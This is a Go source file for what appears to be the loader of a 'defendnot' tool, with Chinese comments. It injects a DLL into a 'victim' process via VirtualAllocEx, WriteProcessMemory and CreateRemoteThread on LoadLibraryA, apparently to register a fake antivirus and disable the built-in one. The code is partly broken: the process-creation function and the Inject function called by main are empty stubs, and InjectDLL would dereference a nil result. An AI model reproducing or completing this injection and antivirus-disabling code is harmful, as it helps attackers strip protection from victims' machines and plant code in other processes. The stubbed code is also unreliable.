package main

import (
	"flag"
	"fmt"
	"github.com/Gr-1m/sys/windows"
	"github.com/Gr-1m/sys/windows/extra"
	"go-defendnot/defendnot-loader/loader"
	"log"
)

func createSuspendedProcess(exePath string) (*windows.ProcessInformation, error) {
	// 实现创建挂起进程的完整逻辑...
	return nil, nil
}

func getLoadLibraryAddress() (uintptr, error) {
	// 获取kernel32.dll中的LoadLibraryA地址...
	//windows.NewLazyDLL("kernel32.dll").NewProc("LoadLibraryA")
	proc, err := windows.MustLoadDLL("kernel32.dll").FindProc("LoadLibraryA")
	if err != nil {
		return 0, err
	}
	return proc.Addr(), nil
}

func Inject(dllPath, procName string) error { return nil }
func InjectDLL(dllPath, procName string) error {
	// 1. 创建挂起进程
	pi, err := createSuspendedProcess(procName)
	if err != nil {
		return fmt.Errorf("创建进程失败: %v", err)
	}
	defer windows.CloseHandle(pi.Thread)

	// 2. 在目标进程分配内存
	memAddr, err := extra.VirtualAllocEx(pi.Process, 0, uintptr(len(dllPath)+1), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if err != nil {
		return fmt.Errorf("内存分配失败: %v", err)
	}

	// 3. 写入DLL路径
	dllPathBytes := append([]byte(dllPath), 0) // 添加null终止符
	err = windows.WriteProcessMemory(pi.Process, memAddr, &dllPathBytes[0], uintptr(len(dllPathBytes)), nil)

	if err != nil {
		return fmt.Errorf("写入内存失败: %v", err)
	}

	// 4. 获取LoadLibraryA地址
	loadLibraryAddr, err := getLoadLibraryAddress()
	if err != nil {
		return err
	}

	// 5. 创建远程线程
	threadHandle, err := extra.CreateRemoteThread(pi.Process, nil, 0, loadLibraryAddr, memAddr, 0, nil)
	if threadHandle == 0 {
		return fmt.Errorf("创建线程失败: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(threadHandle))

	// 6. 等待线程完成
	_, err = windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
	if err != nil {
		return fmt.Errorf("等待线程失败: %v", err)
	}

	return nil
}
func main() {
	var argsConfig = &loader.ArgsConfig{}
	flag.StringVar(&argsConfig.Name, "n", loader.RepoUrl, "av display name")
	flag.BoolVar(&argsConfig.Disable, "d", false, "disable defendnot")
	//flag.Usage()
	flag.Parse()

	if err := Inject(loader.DllName, loader.VictimProcess); err != nil {
		log.Fatal(err)
	}
}
